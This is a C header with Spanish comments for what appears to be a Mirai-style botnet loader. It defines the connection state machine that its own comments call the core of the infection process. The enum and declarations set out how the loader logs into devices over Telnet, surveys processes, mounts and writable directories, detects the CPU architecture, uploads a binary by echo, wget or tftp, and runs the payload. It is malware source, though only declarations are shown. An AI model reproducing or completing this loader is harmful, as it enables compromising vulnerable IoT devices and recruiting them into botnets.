/**************************************************************************
 * Archivo: connection.h
 * 
 * Descripción: Definición de la máquina de estados para conexiones Telnet.
 * Este módulo implementa:
 * - Gestión del ciclo de vida de conexiones
 * - Máquina de estados para el protocolo Telnet
 * - Proceso completo de infección
 * - Manejo de buffers y recursos
 * 
 * El código es el núcleo del proceso de infección, manejando desde
 * la conexión inicial hasta la ejecución del payload.
 **************************************************************************/

#pragma once

/***************************************************************************
 * Inclusión de cabeceras
 ***************************************************************************/
#include <time.h>       /* Funciones de tiempo */
#include <pthread.h>    /* Soporte para multi-threading */
#include "includes.h"   /* Definiciones comunes */
#include "telnet_info.h"/* Información de sesión Telnet */

/**
 * Estructura principal de una conexión
 * 
 * Esta estructura mantiene el estado completo de una conexión Telnet,
 * incluyendo:
 * - Estado de la máquina de estados
 * - Buffers de E/S
 * - Información de autenticación
 * - Control de recursos
 */
struct connection {
    pthread_mutex_t lock;           /* Mutex para acceso thread-safe */
    struct server *srv;             /* Servidor al que pertenece la conexión */
    struct binary *bin;             /* Binario a cargar en el objetivo */
    struct telnet_info info;        /* Información de la sesión Telnet */
    
    int fd;                         /* Descriptor del socket */
    int echo_load_pos;             /* Posición actual en carga por echo */
    time_t last_recv;              /* Timestamp del último dato recibido */

    /* 
     * Máquina de estados del protocolo Telnet
     * Define la secuencia completa del proceso de infección:
     */
    enum {
        TELNET_CLOSED,          /* 0: Conexión cerrada */
        TELNET_CONNECTING,      /* 1: Estableciendo conexión */
        TELNET_READ_IACS,       /* 2: Leyendo comandos IAC */
        TELNET_USER_PROMPT,     /* 3: Esperando prompt de usuario */
        TELNET_PASS_PROMPT,     /* 4: Esperando prompt de contraseña */
        TELNET_WAITPASS_PROMPT, /* 5: Esperando validación de contraseña */
        TELNET_CHECK_LOGIN,     /* 6: Verificando credenciales */
        TELNET_VERIFY_LOGIN,    /* 7: Confirmando acceso exitoso */
        TELNET_PARSE_PS,        /* 8: Analizando procesos (ps) */
        TELNET_PARSE_MOUNTS,    /* 9: Analizando puntos de montaje */
        TELNET_READ_WRITEABLE,  /* 10: Buscando directorios escribibles */
        TELNET_COPY_ECHO,       /* 11: Copiando mediante echo */
        TELNET_DETECT_ARCH,     /* 12: Detectando arquitectura */
        TELNET_ARM_SUBTYPE,     /* 13: Identificando subtipo ARM */
        TELNET_UPLOAD_METHODS,  /* 14: Detectando métodos de carga */
        TELNET_UPLOAD_ECHO,     /* 15: Cargando mediante echo */
        TELNET_UPLOAD_WGET,     /* 16: Cargando mediante wget */
        TELNET_UPLOAD_TFTP,     /* 17: Cargando mediante tftp */
        TELNET_RUN_BINARY,      /* 18: Ejecutando el payload */
        TELNET_CLEANUP          /* 19: Limpieza final */
    } state_telnet;

    /* Buffer y control de salida */
    struct {
        char data[512];         /* Datos pendientes de envío */
        int deadline;           /* Tiempo límite para envío */
    } output_buffer;

    /* Control de buffer y estado */
    uint16_t rdbuf_pos;         /* Posición actual en buffer de lectura */
    uint16_t timeout;           /* Timeout para operaciones */
    
    /* Flags de estado */
    BOOL open;                  /* Conexión activa */
    BOOL success;              /* Infección exitosa */
    BOOL retry_bin;            /* Reintentar carga de binario */
    BOOL ctrlc_retry;          /* Reintentar después de Ctrl+C */
    
    uint8_t rdbuf[8192];       /* Buffer de lectura principal */
};

/***************************************************************************
 * Funciones de gestión del ciclo de vida
 ***************************************************************************/

/**
 * Inicializa una nueva conexión
 * @param conn  Conexión a inicializar
 */
void connection_open(struct connection *conn);

/**
 * Cierra y limpia una conexión
 * @param conn  Conexión a cerrar
 */
void connection_close(struct connection *conn);

/***************************************************************************
 * Funciones de protocolo Telnet y autenticación
 ***************************************************************************/

/**
 * Procesa comandos IAC del protocolo Telnet
 * @param conn  Conexión activa
 * @return      Bytes procesados o 0 si falló
 */
int connection_consume_iacs(struct connection *conn);

/**
 * Detecta prompt de login
 * @param conn  Conexión activa
 * @return      Posición del prompt o 0 si no se encuentra
 */
int connection_consume_login_prompt(struct connection *conn);

/**
 * Detecta prompt de contraseña
 * @param conn  Conexión activa
 * @return      Posición del prompt o 0 si no se encuentra
 */
int connection_consume_password_prompt(struct connection *conn);

/**
 * Detecta cualquier tipo de prompt
 * @param conn  Conexión activa
 * @return      Posición del prompt o 0 si no se encuentra
 */
int connection_consume_prompt(struct connection *conn);

/**
 * Verifica login exitoso
 * @param conn  Conexión activa
 * @return      Posición del token de éxito o 0 si falló
 */
int connection_consume_verify_login(struct connection *conn);

/***************************************************************************
 * Funciones de análisis del sistema
 ***************************************************************************/

/**
 * Analiza salida del comando ps
 * @param conn  Conexión activa
 * @return      Offset procesado o 0 si no terminó
 */
int connection_consume_psoutput(struct connection *conn);

/**
 * Analiza puntos de montaje
 * @param conn  Conexión activa
 * @return      Offset procesado o 0 si no terminó
 */
int connection_consume_mounts(struct connection *conn);

/**
 * Verifica directorios escribibles
 * @param conn  Conexión activa
 * @return      Offset procesado o 0 si no terminó
 */
int connection_consume_written_dirs(struct connection *conn);

/**
 * Verifica operación de copia
 * @param conn  Conexión activa
 * @return      Offset procesado o 0 si no terminó
 */
int connection_consume_copy_op(struct connection *conn);

/***************************************************************************
 * Funciones de detección de arquitectura
 ***************************************************************************/

/**
 * Detecta arquitectura del sistema
 * @param conn  Conexión activa
 * @return      Offset procesado o 0 si no terminó
 */
int connection_consume_arch(struct connection *conn);

/**
 * Detecta subtipo específico de ARM
 * @param conn  Conexión activa
 * @return      Offset procesado o 0 si no terminó
 */
int connection_consume_arm_subtype(struct connection *conn);

/***************************************************************************
 * Funciones de carga de payload
 ***************************************************************************/

/**
 * Detecta métodos de carga disponibles
 * @param conn  Conexión activa
 * @return      Offset procesado o 0 si no terminó
 */
int connection_consume_upload_methods(struct connection *conn);

/**
 * Carga payload usando echo
 * @param conn  Conexión activa
 * @return      Offset procesado o 0 si no terminó
 */
int connection_upload_echo(struct connection *conn);

/**
 * Carga payload usando wget
 * @param conn  Conexión activa
 * @return      Offset procesado o 0 si no terminó
 */
int connection_upload_wget(struct connection *conn);

/**
 * Carga payload usando tftp
 * @param conn  Conexión activa
 * @return      Offset procesado o 0 si no terminó
 */
int connection_upload_tftp(struct connection *conn);

/**
 * Verifica ejecución del payload
 * @param conn  Conexión activa
 * @return      Estado de verificación
 */
int connection_verify_payload(struct connection *conn);

/**
 * Realiza limpieza final
 * @param conn  Conexión activa
 * @return      Offset procesado o 0 si no terminó
 */
int connection_consume_cleanup(struct connection *conn);

/***************************************************************************
 * Funciones de utilidad internas
 ***************************************************************************/

/**
 * Verifica si hay suficientes bytes para consumir
 * @param conn    Conexión activa
 * @param ptr     Puntero actual en el buffer
 * @param amount  Cantidad de bytes a consumir
 * @return        TRUE si hay suficientes bytes, FALSE si no
 */
static BOOL can_consume(struct connection *conn, uint8_t *ptr, int amount);
